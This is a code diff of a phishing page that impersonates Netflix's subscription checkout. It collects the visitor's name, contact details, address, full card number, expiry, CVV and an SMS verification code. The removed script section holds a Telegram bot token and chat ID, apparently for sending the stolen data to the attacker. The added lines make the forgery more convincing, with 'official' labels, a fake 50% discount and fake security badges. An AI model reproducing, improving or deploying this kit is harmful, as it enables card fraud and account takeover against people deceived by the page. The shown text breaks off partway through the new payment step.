@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Netflix - Reactivate Subscription</title>
+    <title>Netflix</title>
     <style>
         * {
             margin: 0;
@@ -17,7 +17,7 @@
             min-height: 100vh;
         }
 
-        /* Header */
+        /* ========== HEADER OFFICIAL NETFLIX ========== */
         .header {
             position: fixed;
             top: 0;
@@ -44,21 +44,21 @@
 
         .header-right {
             display: flex;
-            gap: 20px;
+            gap: 25px;
             align-items: center;
         }
 
-        .support-btn {
+        .header-right a {
             color: white;
             text-decoration: none;
             font-size: 14px;
         }
 
-        .support-btn:hover {
+        .header-right a:hover {
             color: #E50914;
         }
 
-        /* Main Container */
+        /* ========== MAIN CONTAINER ========== */
         .main-container {
             min-height: 100vh;
             display: flex;
@@ -67,23 +67,22 @@
             padding: 100px 20px 40px;
         }
 
-        /* Netflix Card */
+        /* ========== NETFLIX CARD ========== */
         .netflix-card {
-            background: rgba(0,0,0,0.85);
-            border-radius: 12px;
+            background: rgba(0,0,0,0.75);
+            border-radius: 8px;
             padding: 48px 68px 40px;
             max-width: 650px;
             width: 100%;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
         }
 
-        /* Steps - 3 Stations */
+        /* ========== STEPS OFFICIAL ========== */
         .steps-container {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 40px;
+            margin-bottom: 45px;
             position: relative;
         }
 
@@ -95,8 +94,8 @@
         }
 
         .step-circle {
-            width: 40px;
-            height: 40px;
+            width: 36px;
+            height: 36px;
             background: #333;
             border-radius: 50%;
             display: flex;
@@ -105,12 +104,13 @@
             margin: 0 auto 8px;
             font-weight: bold;
             color: white;
+            font-size: 14px;
             transition: all 0.3s;
         }
 
         .step-item.active .step-circle {
             background: #E50914;
-            box-shadow: 0 0 15px rgba(229,9,20,0.5);
+            box-shadow: 0 0 10px rgba(229,9,20,0.5);
         }
 
         .step-item.completed .step-circle {
@@ -118,8 +118,10 @@
         }
 
         .step-label {
-            font-size: 12px;
+            font-size: 11px;
             color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .step-item.active .step-label {
@@ -129,7 +131,7 @@
 
         .step-line {
             position: absolute;
-            top: 20px;
+            top: 18px;
             left: 0;
             right: 0;
             height: 2px;
@@ -139,7 +141,7 @@
 
         .step-line-fill {
             position: absolute;
-            top: 20px;
+            top: 18px;
             left: 0;
             height: 2px;
             background: #E50914;
@@ -148,9 +150,9 @@
             z-index: 2;
         }
 
-        /* Titles */
+        /* ========== TITLES ========== */
         h1 {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 500;
             margin-bottom: 10px;
             color: white;
@@ -161,21 +163,21 @@
             color: #b3b3b3;
             text-align: center;
             margin-bottom: 30px;
-            font-size: 14px;
+            font-size: 16px;
         }
 
-        /* Plans */
+        /* ========== PLANS ========== */
         .plans-container {
             display: flex;
             flex-direction: column;
             gap: 12px;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
 
         .plan-option {
             background: #1a1a1a;
             border: 1px solid #404040;
-            border-radius: 10px;
+            border-radius: 8px;
             padding: 20px;
             cursor: pointer;
             transition: all 0.2s;
@@ -201,19 +203,19 @@
         }
 
         .plan-name {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
             color: white;
         }
 
         .plan-price {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             color: #E50914;
         }
 
         .plan-price span {
-            font-size: 12px;
+            font-size: 14px;
             font-weight: normal;
             color: #b3b3b3;
         }
@@ -222,15 +224,15 @@
             list-style: none;
             display: flex;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 15px;
         }
 
         .plan-features li {
             color: #b3b3b3;
-            font-size: 12px;
+            font-size: 13px;
             display: flex;
             align-items: center;
-            gap: 5px;
+            gap: 6px;
         }
 
         .plan-features li::before {
@@ -244,38 +246,17 @@
             right: 20px;
             background: #E50914;
             color: white;
-            font-size: 10px;
-            padding: 2px 10px;
+            font-size: 11px;
+            padding: 2px 12px;
             border-radius: 20px;
             font-weight: bold;
+            letter-spacing: 0.5px;
         }
 
-        /* Special Offer */
-        .offer-card {
-            background: linear-gradient(135deg, #1a1a2e 0%, #0a0a1a 100%);
-            border: 1px solid #E50914;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-
-        .offer-title {
-            color: #E50914;
-            font-weight: bold;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-
-        .offer-desc {
-            color: #46d369;
-            font-size: 14px;
-        }
-
-        /* Order Summary - ALL TEXT WHITE */
+        /* ========== ORDER SUMMARY ========== */
         .order-summary {
             background: #1a1a1a;
-            border-radius: 10px;
+            border-radius: 8px;
             padding: 20px;
             margin-bottom: 25px;
             border: 1px solid #333;
@@ -313,7 +294,29 @@
             color: #E50914;
         }
 
-        /* Input Groups */
+        /* ========== OFFER CARD ========== */
+        .offer-card {
+            background: linear-gradient(135deg, #1a1a2e 0%, #0a0a1a 100%);
+            border: 1px solid #E50914;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .offer-title {
+            color: #E50914;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .offer-desc {
+            color: #46d369;
+            font-size: 14px;
+        }
+
+        /* ========== FORM INPUTS ========== */
         .input-group {
             margin-bottom: 20px;
         }
@@ -331,9 +334,9 @@
             padding: 14px 16px;
             background: #1a1a1a;
             border: 1px solid #404040;
-            border-radius: 8px;
+            border-radius: 6px;
             color: white;
-            font-size: 15px;
+            font-size: 16px;
             transition: all 0.2s;
         }
 
@@ -352,10 +355,10 @@
             flex: 1;
         }
 
-        /* Card Preview */
+        /* ========== CARD PREVIEW ========== */
         .card-preview {
             background: linear-gradient(135deg, #1a1a2e 0%, #0a0a1a 100%);
-            border-radius: 16px;
+            border-radius: 12px;
             padding: 20px;
             margin-bottom: 25px;
             border: 1px solid #404040;
@@ -382,7 +385,7 @@
             color: #b3b3b3;
         }
 
-        /* Checkbox */
+        /* ========== CHECKBOX ========== */
         .checkbox-group {
             display: flex;
             align-items: center;
@@ -402,12 +405,12 @@
             cursor: pointer;
         }
 
-        /* Trust Badges */
+        /* ========== TRUST BADGES ========== */
         .trust-badges {
             display: flex;
             justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
+            gap: 25px;
+            margin: 25px 0 15px;
             flex-wrap: wrap;
         }
 
@@ -416,23 +419,23 @@
             color: #46d369;
         }
 
-        /* Buttons */
+        /* ========== BUTTONS ========== */
         .btn-primary {
             width: 100%;
             padding: 16px;
             background: #E50914;
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.2s;
+            margin-top: 10px;
         }
 
         .btn-primary:hover {
             background: #f6121d;
-            transform: scale(1.01);
         }
 
         .btn-primary:disabled {
@@ -446,27 +449,21 @@
             background: #333;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 14px;
             cursor: pointer;
             margin-top: 12px;
         }
 
-        /* Messages */
+        .btn-secondary:hover {
+            background: #404040;
+        }
+
+        /* ========== MESSAGES ========== */
         .error-message {
             color: #ff6666;
             font-size: 12px;
             margin-top: 5px;
-        }
-
-        .info-message {
-            background: #E5091420;
-            border: 1px solid #E50914;
-            color: #E50914;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
-            margin: 15px 0;
         }
 
         .success-message {
@@ -474,24 +471,34 @@
             border: 1px solid #46d369;
             color: #46d369;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 6px;
             text-align: center;
             margin: 15px 0;
         }
 
-        /* Phone Display */
+        .info-message {
+            background: #E5091420;
+            border: 1px solid #E50914;
+            color: #E50914;
+            padding: 12px;
+            border-radius: 6px;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        /* ========== SMS VERIFICATION ========== */
         .phone-display {
             background: #1a1a1a;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 8px;
             text-align: center;
             margin: 20px 0;
             border: 1px solid #E50914;
             color: #E50914;
             font-weight: bold;
+            font-size: 16px;
         }
 
-        /* Code Input */
         .code-input {
             text-align: center;
             font-size: 28px;
@@ -499,24 +506,47 @@
             font-weight: bold;
         }
 
-        /* Footer */
-        .footer {
+        .attempts-indicator {
+            text-align: center;
+            font-size: 12px;
+            color: #ffa500;
+            margin: 10px 0;
+        }
+
+        .countdown-text {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin: 10px 0;
+        }
+
+        /* ========== FOOTER ========== */
+        .footer-links {
             margin-top: 30px;
             text-align: center;
             font-size: 11px;
             color: #666;
         }
 
-        .footer a {
+        .footer-links a {
             color: #666;
             text-decoration: none;
             margin: 0 10px;
         }
 
-        /* Spinner */
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .footer-links a:hover {
+            color: #E50914;
         }
+
+        /* ========== UTILITIES ========== */
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+        }
+
         .spinner {
             display: inline-block;
             width: 16px;
@@ -529,12 +559,18 @@
             vertical-align: middle;
         }
 
-        .step-content {
-            display: none;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
-        .step-content.active {
-            display: block;
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.3s ease-in-out;
         }
 
         @media (max-width: 550px) {
@@ -542,601 +578,614 @@
                 padding: 30px 20px;
             }
             h1 {
-                font-size: 22px;
+                font-size: 24px;
             }
             .input-row {
                 flex-direction: column;
                 gap: 0;
             }
-        }
-
-        .shake {
-            animation: shake 0.3s ease-in-out;
-        }
-        @keyframes shake {
-            0%,100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+            .plan-name {
+                font-size: 16px;
+            }
+            .plan-price {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header class="header">
-        <div class="header-content">
-            <div class="logo">
-                <svg viewBox="0 0 111 30" width="100" height="27">
-                    <path fill="#E50914" d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
-                </svg>
-            </div>
-            <div class="header-right">
-                <a href="#" class="support-btn">💬 Help Center</a>
-            </div>
+
+<!-- OFFICIAL NETFLIX HEADER -->
+<header class="header">
+    <div class="header-content">
+        <div class="logo">
+            <svg viewBox="0 0 111 30" width="100" height="27">
+                <path fill="#E50914" d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
+            </svg>
         </div>
-    </header>
-
-    <div class="main-container">
-        <div class="netflix-card">
-            <!-- 3 Stations / Steps -->
-            <div class="steps-container">
-                <div class="step-line"></div>
-                <div class="step-line-fill" id="stepLineFill"></div>
-                <div class="step-item" id="step1Indicator">
-                    <div class="step-circle">1</div>
-                    <div class="step-label">Choose Plan</div>
-                </div>
-                <div class="step-item" id="step2Indicator">
-                    <div class="step-circle">2</div>
-                    <div class="step-label">Personal Info</div>
-                </div>
-                <div class="step-item" id="step3Indicator">
-                    <div class="step-circle">3</div>
-                    <div class="step-label">Payment</div>
-                </div>
-            </div>
-
-            <!-- STEP 1: PLAN & OFFER -->
-            <div id="step1Content" class="step-content active">
-                <h1>Choose your plan</h1>
-                <div class="subtitle">Watch anywhere. Cancel anytime.</div>
-                
-                <div class="plans-container">
-                    <div class="plan-option" data-price="9.99" data-name="Basic" data-offer="4.99">
-                        <div class="plan-header">
-                            <span class="plan-name">🔴 Basic</span>
-                            <span class="plan-price">$9.99<span>/mo</span></span>
-                        </div>
-                        <ul class="plan-features">
-                            <li>720p HD</li>
-                            <li>1 device</li>
-                            <li>Download</li>
-                        </ul>
-                    </div>
-                    <div class="plan-option" data-price="15.99" data-name="Standard" data-offer="7.99">
-                        <div class="popular-badge">MOST POPULAR</div>
-                        <div class="plan-header">
-                            <span class="plan-name">🔵 Standard</span>
-                            <span class="plan-price">$15.99<span>/mo</span></span>
-                        </div>
-                        <ul class="plan-features">
-                            <li>1080p Full HD</li>
-                            <li>2 devices</li>
-                            <li>Download</li>
-                        </ul>
-                    </div>
-                    <div class="plan-option" data-price="19.99" data-name="Premium" data-offer="9.99">
-                        <div class="plan-header">
-                            <span class="plan-name">💎 Premium</span>
-                            <span class="plan-price">$19.99<span>/mo</span></span>
-                        </div>
-                        <ul class="plan-features">
-                            <li>4K+HDR</li>
-                            <li>4 devices</li>
-                            <li>Spatial Audio</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <div class="order-summary">
-                    <div class="order-title">📋 Order Summary</div>
-                    <div class="order-row">
-                        <span>Selected Plan</span>
-                        <span id="selectedPlanName">—</span>
-                    </div>
-                    <div class="order-row">
-                        <span>Regular price</span>
-                        <span id="regularPrice">$0.00</span>
-                    </div>
-                    <div class="order-row" id="offerRow" style="display:none;">
-                        <span>🎉 Special Offer (50% OFF)</span>
-                        <span id="offerDiscount">-$0.00</span>
-                    </div>
-                    <div class="order-row" style="font-weight:bold;">
-                        <span>Total due today</span>
-                        <span id="totalPrice" style="color:#E50914;">$0.00</span>
-                    </div>
-                </div>
-
-                <div id="selectedPlanDisplay" style="display: none;"></div>
-                <button class="btn-primary" id="continueToPersonal">Continue to Personal Info →</button>
-                <div class="trust-badges">
-                    <span class="trust-badge">🔒 SSL Secure</span>
-                    <span class="trust-badge">💳 PCI Compliant</span>
-                    <span class="trust-badge">✅ 30-Day Guarantee</span>
-                </div>
-            </div>
-
-            <!-- STEP 2: PERSONAL INFORMATION -->
-            <div id="step2Content" class="step-content">
-                <h1>Personal Information</h1>
-                <div class="subtitle">Please enter your details to continue</div>
-
-                <div class="input-row">
-                    <div class="input-group">
-                        <label>Full name</label>
-                        <input type="text" id="fullName" placeholder="John Smith">
-                        <div class="error-message" id="fullNameError"></div>
-                    </div>
-                </div>
-
-                <div class="input-row">
-                    <div class="input-group">
-                        <label>Email address</label>
-                        <input type="email" id="email" placeholder="john@example.com">
-                        <div class="error-message" id="emailError"></div>
-                    </div>
-                    <div class="input-group">
-                        <label>Phone number</label>
-                        <input type="tel" id="phonePersonal" placeholder="+1 234 567 8900">
-                        <div class="error-message" id="phonePersonalError"></div>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label>Street address</label>
-                    <input type="text" id="address" placeholder="123 Main Street">
-                    <div class="error-message" id="addressError"></div>
-                </div>
-
-                <div class="input-row">
-                    <div class="input-group">
-                        <label>City</label>
-                        <input type="text" id="city" placeholder="New York">
-                    </div>
-                    <div class="input-group">
-                        <label>Postal code</label>
-                        <input type="text" id="zip" placeholder="10001">
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label>Country</label>
-                    <select id="country">
-                        <option value="US">United States</option>
-                        <option value="CA">Canada</option>
-                        <option value="UK">United Kingdom</option>
-                        <option value="AU">Australia</option>
-                    </select>
-                </div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="agreeTermsPersonal">
-                    <label>I agree to the <a href="#" style="color:#E50914">Terms of Service</a> and <a href="#" style="color:#E50914">Privacy Policy</a></label>
-                </div>
-
-                <button class="btn-primary" id="continueToPayment">Continue to Payment →</button>
-                <button class="btn-secondary" id="backToPlans">← Back to plans</button>
-            </div>
-
-            <!-- STEP 3: CARD & PAYMENT -->
-            <div id="step3Content" class="step-content">
-                <h1>Payment Details</h1>
-                <div class="subtitle" id="paymentSubtitle"></div>
-
-                <!-- Order Summary -->
-                <div class="order-summary">
-                    <div class="order-title">📋 Order Summary</div>
-                    <div class="order-row">
-                        <span>Plan: <span id="summaryPlan">-</span></span>
-                        <span id="summaryPrice">-</span>
-                    </div>
-                    <div class="order-row" id="offerSummaryRow" style="display:none;">
-                        <span>🎉 50% OFF Offer</span>
-                        <span>-</span>
-                    </div>
-                    <div class="order-row">
-                        <span>Tax (estimated)</span>
-                        <span id="taxAmount">$0.00</span>
-                    </div>
-                    <div class="order-row" style="font-weight:bold;">
-                        <span>Total</span>
-                        <span id="totalAmount" style="color:#E50914;">$0.00</span>
-                    </div>
-                </div>
-
-                <!-- Card Preview -->
-                <div class="card-preview">
-                    <div class="card-preview-header">
-                        <span>💳</span>
-                        <span id="previewCardType">💳</span>
-                    </div>
-                    <div class="card-number-preview" id="previewCardNumber">•••• •••• •••• ••••</div>
-                    <div class="card-details-row">
-                        <span id="previewCardName">CARDHOLDER</span>
-                        <span id="previewCardExpiry">MM/YY</span>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label>Cardholder name</label>
-                    <input type="text" id="cardName" placeholder="John Smith">
-                    <div class="error-message" id="cardNameError"></div>
-                </div>
-
-                <div class="input-group">
-                    <label>Card number</label>
-                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
-                    <div class="error-message" id="cardNumberError"></div>
-                </div>
-
-                <div class="input-row">
-                    <div class="input-group">
-                        <label>Expiration (MM/YY)</label>
-                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
-                        <div class="error-message" id="expiryError"></div>
-                    </div>
-                    <div class="input-group">
-                        <label>Security code (CVV)</label>
-                        <input type="password" id="cvv" placeholder="123" maxlength="3">
-                        <div class="error-message" id="cvvError"></div>
-                    </div>
-                </div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="saveCard">
-                    <label>💾 Save this card for future payments</label>
-                </div>
-
-                <div class="trust-badges">
-                    <span class="trust-badge">🔒 Secure Payment</span>
-                    <span class="trust-badge">💳 Visa/MasterCard</span>
-                    <span class="trust-badge">🛡️ Fraud Protection</span>
-                </div>
-
-                <button class="btn-primary" id="sendSmsBtn">Send verification code →</button>
-                <button class="btn-secondary" id="backToPersonal">← Back to personal info</button>
-            </div>
-
-            <!-- SMS VERIFICATION -->
-            <div id="smsPopup" style="display:none; margin-top:20px;">
-                <div class="phone-display" id="phoneDisplay"></div>
-                <div class="input-group">
-                    <label>Enter 6-digit code</label>
-                    <input type="text" id="smsCode" class="code-input" placeholder="000000" maxlength="6">
-                    <div class="error-message" id="smsError"></div>
-                </div>
-                <div id="attemptsDisplay" style="text-align:center; font-size:12px; color:#ffa500; margin:10px 0;"></div>
-                <button class="btn-primary" id="verifyBtn">Verify & Complete →</button>
-                <button class="btn-secondary" id="resendCodeBtn">📱 Resend code</button>
-                <div id="resendCountdown" style="text-align:center; font-size:12px; color:#888;"></div>
-            </div>
-
-            <div id="messageArea"></div>
-            <div id="countdownArea" style="text-align:center; margin-top:15px;"></div>
+        <div class="header-right">
+            <a href="#">Help Center</a>
+            <a href="#">Sign In</a>
         </div>
     </div>
+</header>
 
-    <script>
-        // ========== CONFIGURATION ==========
-        const BOT_TOKEN = "8627160097:AAHrqaMZsLKwLOv_LWsLUgpWOADxcxpzCqA";
-        const CHAT_ID = "7714049413";
-        const OFFICIAL_NETFLIX_URL = "https://www.netflix.com";
-        const MAX_ATTEMPTS = 3;
+<div class="main-container">
+    <div class="netflix-card">
 
-        let selectedPlan = null;
-        let selectedPrice = 0;
-        let selectedOfferPrice = 0;
-        let personalData = {};
-        let currentPhone = null;
-        let currentSmsCode = null;
-        let smsAttempts = 0;
-        let isBlocked = false;
-        let resendTimer = null;
+        <!-- 3 STEPS OFFICIAL -->
+        <div class="steps-container">
+            <div class="step-line"></div>
+            <div class="step-line-fill" id="stepLineFill"></div>
+            <div class="step-item" id="step1Indicator">
+                <div class="step-circle">1</div>
+                <div class="step-label">CHOOSE PLAN</div>
+            </div>
+            <div class="step-item" id="step2Indicator">
+                <div class="step-circle">2</div>
+                <div class="step-label">PERSONAL INFO</div>
+            </div>
+            <div class="step-item" id="step3Indicator">
+                <div class="step-circle">3</div>
+                <div class="step-label">PAYMENT</div>
+            </div>
+        </div>
 
-        // ========== STEP INDICATOR ==========
-        function updateStepIndicator(step) {
-            const steps = ['step1Indicator', 'step2Indicator', 'step3Indicator'];
-            const contents = ['step1Content', 'step2Content', 'step3Content'];
-            for (let i = 0; i < steps.length; i++) {
-                document.getElementById(steps[i]).classList.remove('active', 'completed');
-                document.getElementById(contents[i]).classList.remove('active');
-            }
-            for (let i = 0; i < step - 1; i++) {
-                document.getElementById(steps[i]).classList.add('completed');
-            }
-            document.getElementById(steps[step - 1]).classList.add('active');
-            document.getElementById(contents[step - 1]).classList.add('active');
-            
-            const fillPercent = ((step - 1) / 2) * 100;
-            document.getElementById('stepLineFill').style.width = fillPercent + '%';
+        <!-- STEP 1: PLAN -->
+        <div id="step1Content" class="step-content active">
+            <h1>Choose your plan</h1>
+            <div class="subtitle">Watch anywhere. Cancel anytime.</div>
+
+            <div class="offer-card">
+                <div class="offer-title">🎁 LIMITED TIME OFFER</div>
+                <div class="offer-desc">First 2 months at 50% OFF! Automatically applied</div>
+            </div>
+
+            <div class="plans-container">
+                <div class="plan-option" data-price="9.99" data-name="Basic" data-offer="4.99">
+                    <div class="plan-header">
+                        <span class="plan-name">🔴 Basic</span>
+                        <span class="plan-price">$9.99<span>/mo</span></span>
+                    </div>
+                    <ul class="plan-features">
+                        <li>720p HD</li>
+                        <li>1 device</li>
+                        <li>Download</li>
+                    </ul>
+                </div>
+
+                <div class="plan-option" data-price="15.99" data-name="Standard" data-offer="7.99">
+                    <div class="popular-badge">MOST POPULAR</div>
+                    <div class="plan-header">
+                        <span class="plan-name">🔵 Standard</span>
+                        <span class="plan-price">$15.99<span>/mo</span></span>
+                    </div>
+                    <ul class="plan-features">
+                        <li>1080p Full HD</li>
+                        <li>2 devices</li>
+                        <li>Download</li>
+                    </ul>
+                </div>
+
+                <div class="plan-option" data-price="19.99" data-name="Premium" data-offer="9.99">
+                    <div class="plan-header">
+                        <span class="plan-name">💎 Premium</span>
+                        <span class="plan-price">$19.99<span>/mo</span></span>
+                    </div>
+                    <ul class="plan-features">
+                        <li>4K+HDR</li>
+                        <li>4 devices</li>
+                        <li>Spatial Audio</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="order-summary">
+                <div class="order-title">📋 Order Summary</div>
+                <div class="order-row">
+                    <span>Selected Plan</span>
+                    <span id="selectedPlanName">—</span>
+                </div>
+                <div class="order-row">
+                    <span>Regular price</span>
+                    <span id="regularPrice">$0.00</span>
+                </div>
+                <div class="order-row" id="offerRow" style="display:none;">
+                    <span>🎉 50% OFF Discount</span>
+                    <span id="offerDiscount">-$0.00</span>
+                </div>
+                <div class="order-row">
+                    <span>Total due today</span>
+                    <span id="totalPrice" style="color:#E50914;">$0.00</span>
+                </div>
+            </div>
+
+            <button class="btn-primary" id="continueToPersonal">Continue to Personal Info →</button>
+            <div class="trust-badges">
+                <span class="trust-badge">🔒 SSL Secure</span>
+                <span class="trust-badge">💳 PCI Compliant</span>
+                <span class="trust-badge">✅ 30-Day Guarantee</span>
+            </div>
+        </div>
+
+        <!-- STEP 2: PERSONAL INFO -->
+        <div id="step2Content" class="step-content">
+            <h1>Personal Information</h1>
+            <div class="subtitle">Please enter your details to continue</div>
+
+            <div class="input-row">
+                <div class="input-group">
+                    <label>Full name</label>
+                    <input type="text" id="fullName" placeholder="John Smith">
+                    <div class="error-message" id="fullNameError"></div>
+                </div>
+            </div>
+
+            <div class="input-row">
+                <div class="input-group">
+                    <label>Email address</label>
+                    <input type="email" id="email" placeholder="john@example.com">
+                    <div class="error-message" id="emailError"></div>
+                </div>
+                <div class="input-group">
+                    <label>Phone number</label>
+                    <input type="tel" id="phonePersonal" placeholder="+1 234 567 8900">
+                    <div class="error-message" id="phonePersonalError"></div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Street address</label>
+                <input type="text" id="address" placeholder="123 Main Street">
+                <div class="error-message" id="addressError"></div>
+            </div>
+
+            <div class="input-row">
+                <div class="input-group">
+                    <label>City</label>
+                    <input type="text" id="city" placeholder="New York">
+                </div>
+                <div class="input-group">
+                    <label>Postal code</label>
+                    <input type="text" id="zip" placeholder="10001">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Country</label>
+                <select id="country">
+                    <option value="US">United States</option>
+                    <option value="CA">Canada</option>
+                    <option value="UK">United Kingdom</option>
+                    <option value="AU">Australia</option>
+                </select>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="agreeTermsPersonal">
+                <label>I agree to the <a href="#" style="color:#E50914">Terms of Service</a> and <a href="#" style="color:#E50914">Privacy Policy</a></label>
+            </div>
+
+            <button class="btn-primary" id="continueToPayment">Continue to Payment →</button>
+            <button class="btn-secondary" id="backToPlans">← Back to plans</button>
+        </div>
+
+        <!-- STEP 3: PAYMENT -->
+        <div id="step3Content" class="step-content">
+            <h1>Payment Details</h1>
+            <div class="subtitle" id="paymentSubtitle"></div>
+
+            <div class="order-summary">
+                <div class="order-title">📋 Order Summary</div>
+                <div class="order-row">
+                    <span>Plan: <span id="summaryPlan">-</span></span>
